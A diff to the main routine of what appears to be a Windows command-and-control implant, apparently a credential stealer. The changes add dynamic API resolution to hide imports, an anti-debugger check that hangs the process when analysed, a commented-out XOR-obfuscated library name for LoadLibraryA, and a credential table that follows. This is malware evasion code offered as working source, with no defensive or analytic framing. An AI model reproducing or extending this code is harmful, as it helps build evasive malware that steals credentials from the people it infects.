@@ -2,8 +2,10 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <wchar.h>
 #include <windows.h>
+#include <winnt.h>
 #include <winsock2.h>
 
 #include "c2.h"
@@ -21,19 +23,29 @@ int main(void) {
   SetConsoleOutputCP(CP_UTF8);
 #endif
 
+  // Init
+  hidden_apis apis = {0};
+  resolve_apis(&apis);
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
 
-  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
-    if (isDebuggerPresent) {
+  if (apis.funcCheckRemoteDebuggerPresent) {
+    if (apis.funcCheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
+      if (isDebuggerPresent) {
 #ifdef DEBUG
-      printf("Debug program detected on the process.\n");
+        printf("Un débogueur est détecté sur ce processus.\n");
 #endif
-      while (1);
+        while (1);
+      } else {
+#ifdef DEBUG
+        printf("Debug program detected on the process.\n");
+#endif
+      }
     } else {
 #ifdef DEBUG
-      printf("No debug process detected on the process\n");
+      printf("Error on CheckRemoteDebuggerPresent call. Error code : %lu\n",
+             GetLastError());
 #endif
     }
   } else {
@@ -69,6 +81,9 @@ int main(void) {
 #endif
     return EXIT_FAILURE;
   }
+  // char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
+  // XOR_STR(msvcrt_str, strlen(msvcrt_str));
+  // apis.funcLoadLibraryA(msvcrt_str);
 
   Credential credTab[CRED_SIZE] = {0};
   DWORD32 lenCredTab = 0;
